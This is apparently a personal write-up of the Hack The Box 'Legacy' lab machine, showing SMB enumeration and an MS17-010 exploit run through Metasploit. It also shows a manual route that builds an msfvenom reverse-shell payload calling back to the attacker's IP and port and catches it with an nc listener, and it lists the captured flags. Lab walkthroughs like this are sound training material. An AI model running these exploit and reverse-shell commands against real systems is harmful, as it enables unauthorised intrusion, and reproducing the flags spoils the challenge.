# Enumeration
## nmap
`nmap -sV -A -v 10.10.10.4 -Pn`
![[Screenshot 2022-05-12 at 13.17.39.png]]

## [SMB](https://www.hackingarticles.in/smb-penetration-testing-port-445/)
`nmap -script smb-vuln* -p 445 10.10.10.4 -Pn`
![[Screenshot 2022-05-12 at 13.25.52.png]]
Using _msfconsole_ and `auxiliary/scanner/smb/smb_ms17_010`
![[Screenshot 2022-05-12 at 13.57.41.png]]

# Exploit - msfconsole
1. `use exploit windows/smb/ms17_010_psexec`
2. `set rhosts 10.10.10.4`
3. `set lhosts 10.10.14.19`
4. `exploit`
--> this gave a meterpreter:
![[Screenshot 2022-05-12 at 14.20.02.png]]
Going to the documents and settings directory we find the user _john_ together with other 
![[Screenshot 2022-05-12 at 14.21.17.png]]
`cat john/Desktop/user.txt` gave the user flag

# Privesc
![[Screenshot 2022-05-12 at 14.21.58.png]]

Trying to get winpeasx86 using `wget` and `curl` did not work.

by simply running `getuid` I saw we were already _NT AUTHORITY\SYSTEM_ which meant we already had admin privileges, so I proceeded to simply `cat Administrator/Desktop/root.txt`

# Privesc without metasploit
1. `git clone https://github.com/helviojunior/MS17-010.git`
2. `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=9001 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_shell.exe` to create payload
3. `python MS17-010.git/send_and_execute.py 10.10.10.4 rev_shell.exe`

This would create a shell in the listener - however I had issues with the impacket module as the send_and_execute.py was written for python2 and I onky have impacket for python3...

I fixed this ^ by doing the following:
1. /HTB/legacy/impacket> `pip2 install .`
2. /HTB/legacy> `python2 send_and_execute.py 10.10.10.4 rev_shell.exe`
set up a nc listener on the port from the payload code made and got a shell + the flags:
![[Screenshot 2022-05-12 at 15.13.55.png]]
# Flags
e69af0e4f443de7e36876fda4ec7644f
993442d258b0e0ec917cae9e695d5713
# Thoughts
- very easy --> good reminder for using meterpreter but did not really learn much in terms of how to use SMB...
# New Things Learnt
- using nmap script for more specific enumeraiton
- [smb enumeration](https://www.hackingarticles.in/smb-penetration-testing-port-445/)
- msf/meterpreter/metasploit is not accepted by OSCP, so from now I will do it without this (or try that frst then the other way..)

# other smb enumeration
1. `smbmap -H 10.10.10.4`
2. `smbclient -N -L //10.10.10.4`